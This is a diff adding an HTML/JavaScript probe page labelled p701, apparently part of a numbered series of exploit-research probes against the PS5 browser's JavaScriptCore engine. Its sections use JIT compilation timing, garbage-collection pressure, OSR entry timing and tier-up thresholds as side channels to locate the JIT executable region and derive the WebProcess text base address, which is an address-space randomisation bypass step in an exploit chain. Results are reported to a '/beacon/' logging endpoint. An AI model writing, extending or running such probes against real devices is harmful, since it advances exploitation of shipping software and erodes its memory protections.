@@ -1,0 +1,273 @@
+<!--
+  p701: JIT executable region oracle via allocation timing
+
+  JSC's DFG JIT allocates executable code from a dedicated memory region
+  (ExecutableAllocator). On PS5, this region is at a fixed offset from
+  the WebProcess text segment (they share the same virtual address space).
+
+  If we can determine the JIT region's address, we derive the text base.
+
+  This probe uses observable side effects of JIT compilation:
+  A) JIT compilation timing as a function of code complexity
+     (reveals whether JIT region is growing, hitting page boundaries)
+  B) Memory pressure from JIT code -- filling the JIT region changes
+     GC behavior, which is observable through FinalizationRegistry
+  C) OSR entry timing -- the time to enter JIT code depends on whether
+     the code is in the same cache line as previous JIT code
+  D) JIT code thrashing -- if we force enough recompilations to fill
+     the JIT region, the allocator behavior changes
+  E) Executable memory exhaustion detection -- what happens when JIT
+     region is full? Does JSC fall back to interpreter?
+  F) DFG tier-up threshold as executable pressure indicator
+
+  CRASH_CLASS: LOW (timing observation, heavy allocation but no corruption)
+  prior art: p698 (JIT internals), p700 (IC stubs), p602 (JIT detection)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p701</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P701-START:JIT-REGION-ORACLE');
+  var results = [];
+
+  // === SECTION A: JIT compilation timing profile ===
+  // Each new Function() that gets JIT-compiled allocates from the
+  // executable region. The time to JIT-compile should show steps
+  // when crossing page boundaries.
+  b('A:JIT-COMPILE-TIMING');
+  try {
+    var compileTimes = [];
+
+    for (var batch = 0; batch < 20; batch++) {
+      // Create 50 unique functions per batch (forces new JIT code)
+      var t0 = performance.now();
+      var fns = [];
+      for (var i = 0; i < 50; i++) {
+        var fn = new Function('x', 'var r = x; ' +
+          'for(var i=0;i<' + (batch*50+i) + ';i++) r = r + ' + (batch*50+i) + '; ' +
+          'return r;');
+        // Force JIT compilation
+        for (var j = 0; j < 10000; j++) fn(j);
+        fns.push(fn);
+      }
+      var dt = performance.now() - t0;
+      compileTimes.push(dt.toFixed(1));
+    }
+
+    b('A:COMPILE-TIMES:' + compileTimes.join(','));
+
+    // Look for steps (page boundary crossings in JIT region)
+    var steps = [];
+    for (var i = 1; i < compileTimes.length; i++) {
+      var ratio = parseFloat(compileTimes[i]) / parseFloat(compileTimes[i-1]);
+      if (ratio > 1.3) steps.push(i + ':+' + ((ratio-1)*100).toFixed(0) + '%');
+    }
+    if (steps.length > 0) {
+      b('A:JIT-STEPS:' + steps.join(','));
+      results.push('A:jit-steps=' + steps.length);
+    }
+  } catch(e) {
+    b('A:ERR:' + e.message);
+  }
+
+  // === SECTION B: JIT region pressure via GC behavior ===
+  // Heavy JIT compilation increases memory pressure which
+  // changes GC collection frequency -- observable via WeakRef
+  b('B:JIT-GC-PRESSURE');
+  try {
+    // Baseline GC rate with no JIT pressure
+    var baseCollected = 0;
+    var fr1 = new FinalizationRegistry(function() { baseCollected++; });
+    for (var i = 0; i < 200; i++) {
+      var obj = {idx: i};
+      fr1.register(obj, i);
+    }
+    // Wait a bit for GC
+    var dummy = [];
+    for (var i = 0; i < 5000; i++) dummy.push(new ArrayBuffer(1024));
+    dummy = null;
+
+    b('B:BASELINE-GC:' + baseCollected);
+
+    // Now create heavy JIT pressure
+    var jitFns = [];
+    for (var i = 0; i < 200; i++) {
+      var fn = new Function('x', 'return x * ' + i + ' + ' + (i*i));
+      for (var j = 0; j < 50000; j++) fn(j);
+      jitFns.push(fn);
+    }
+
+    // Check GC rate under JIT pressure
+    var pressureCollected = 0;
+    var fr2 = new FinalizationRegistry(function() { pressureCollected++; });
+    for (var i = 0; i < 200; i++) {
+      var obj = {idx: i};
+      fr2.register(obj, i);
+    }
+    var dummy2 = [];
+    for (var i = 0; i < 5000; i++) dummy2.push(new ArrayBuffer(1024));
+    dummy2 = null;
+
+    b('B:PRESSURE-GC:' + pressureCollected);
+    b('B:JIT-FNS-CREATED:' + jitFns.length);
+
+    if (pressureCollected > baseCollected * 1.5) {
+      b('B:GC-PRESSURE-DETECTED');
+      results.push('B:gc-pressure');
+    }
+  } catch(e) {
+    b('B:ERR:' + e.message);
+  }
+
+  // === SECTION C: OSR entry timing variation ===
+  // Time entering JIT code from interpreter for different functions
+  // Functions allocated close together in JIT region should have
+  // similar cache behavior (faster). Functions far apart = cache miss.
+  b('C:OSR-ENTRY-TIMING');
+  try {
+    // Create functions at different "times" (different JIT region offsets)
+    var earlyFn = new Function('x', 'return x + 1');
+    for (var i = 0; i < 200000; i++) earlyFn(i);
+
+    // Create filler to push the next function far away in JIT region
+    var fillers = [];
+    for (var i = 0; i < 100; i++) {
+      var f = new Function('x', 'var r = x; ' +
+        'for(var j=0;j<10;j++) r = r * 2 + ' + i + '; return r;');
+      for (var j = 0; j < 50000; j++) f(j);
+      fillers.push(f);
+    }
+
+    var lateFn = new Function('x', 'return x + 2');
+    for (var i = 0; i < 200000; i++) lateFn(i);
+
+    // Now time alternating calls between early and late functions
+    // If they're far apart in JIT region, alternating = cache pressure
+    var alternateTime = performance.now();
+    for (var i = 0; i < 100000; i++) {
+      if (i & 1) earlyFn(i); else lateFn(i);
+    }
+    var altDt = performance.now() - alternateTime;
+
+    // Compare with sequential calls (same cache line)
+    var seqTime = performance.now();
+    for (var i = 0; i < 50000; i++) earlyFn(i);
+    for (var i = 0; i < 50000; i++) lateFn(i);
+    var seqDt = performance.now() - seqTime;
+
+    b('C:ALTERNATE=' + altDt.toFixed(2) + ',SEQUENTIAL=' + seqDt.toFixed(2));
+    var ratio = altDt / seqDt;
+    b('C:RATIO=' + ratio.toFixed(3));
+    if (ratio > 1.2) {
+      b('C:CACHE-PRESSURE-DETECTED');
+      results.push('C:cache-pressure=' + ratio.toFixed(2));
+    }
+  } catch(e) {
+    b('C:ERR:' + e.message);
+  }
+
+  // === SECTION D: JIT code size measurement ===
+  // By observing when compilation slows down or falls back to
+  // interpreter, we can estimate the JIT region size
+  b('D:JIT-REGION-SIZE');
+  try {
+    var jitCountdown = [];
+    var interpreterFallback = -1;
+
+    for (var batch = 0; batch < 30; batch++) {
+      var t0 = performance.now();
+      var fn = new Function('x',
+        'var r = x; ' +
+        'for(var i=0;i<100;i++){' +
+        'r = (r * 0x5DEECE66D + 0xB) & 0xFFFFFFFF;'.repeat(10) +
+        '} return r;');
+
+      // Try to JIT compile
+      for (var j = 0; j < 100000; j++) fn(j);
+
+      // Measure execution speed (JIT vs interpreter)
+      var execT0 = performance.now();
+      for (var j = 0; j < 10000; j++) fn(42);
+      var execDt = performance.now() - execT0;
+
+      var compileDt = performance.now() - t0;
+      jitCountdown.push(batch + ':c=' + compileDt.toFixed(0) + '/e=' + execDt.toFixed(2));
+
+      // Detect interpreter fallback (exec time jumps)
+      if (batch > 0 && execDt > 10 && interpreterFallback < 0) {
+        interpreterFallback = batch;
+      }
+    }
+
+    b('D:JIT-COUNTDOWN:' + jitCountdown.slice(0, 10).join(','));
+    b('D:JIT-COUNTDOWN2:' + jitCountdown.slice(10, 20).join(','));
+    if (interpreterFallback >= 0) {
+      b('D:INTERPRETER-FALLBACK-AT:batch=' + interpreterFallback);
+      results.push('D:fallback=' + interpreterFallback);
+    }
+  } catch(e) {
+    b('D:ERR:' + e.message);
+  }
+
+  // === SECTION E: DFG tier-up threshold measurement ===
+  // The loop count needed for DFG to kick in reveals internal thresholds
+  // and whether executable memory pressure changes the threshold
+  b('E:TIERUP-THRESHOLD');
+  try {
+    function measureTierup() {
+      // Create a fresh function
+      var fn = new Function('x', 'return x * x + 1');
+
+      // Call in increasing batches, measure when JIT kicks in
+      var thresholdFound = -1;
+      var prevTime = 0;
+
+      for (var count = 1000; count <= 500000; count += 1000) {
+        var t0 = performance.now();
+        for (var i = 0; i < 1000; i++) fn(i);
+        var dt = performance.now() - t0;
+
+        if (prevTime > 0 && dt < prevTime * 0.3 && thresholdFound < 0) {
+          thresholdFound = count;
+        }
+        prevTime = dt;
+      }
+      return thresholdFound;
+    }
+
+    // Measure threshold fresh
+    var t1 = measureTierup();
+    b('E:THRESHOLD-1:' + t1);
+
+    // Create JIT pressure then measure again
+    var pressure = [];
+    for (var i = 0; i < 50; i++) {
+      var f = new Function('x', 'return x + ' + (i * 137));
+      for (var j = 0; j < 100000; j++) f(j);
+      pressure.push(f);
+    }
+
+    var t2 = measureTierup();
+    b('E:THRESHOLD-2:' + t2);
+
+    if (t1 > 0 && t2 > 0 && Math.abs(t2 - t1) > 5000) {
+      b('E:THRESHOLD-SHIFTED:' + t1 + '->' + t2);
+      results.push('E:threshold-shift');
+    }
+  } catch(e) {
+    b('E:ERR:' + e.message);
+  }
+
+  // === RESULTS ===
+  if (results.length > 0) {
+    b('P701-RESULT:HITS=' + results.join(';'));
+  } else {
+    b('P701-RESULT:NO-LEAK-DETECTED');
+  }
+  b('P701-DONE');
+}
+
+setTimeout(main, 300);
+</script>
+</head><body style="margin:0"><pre id="log">p701: JIT executable region oracle via allocation timing</pre></body></html>
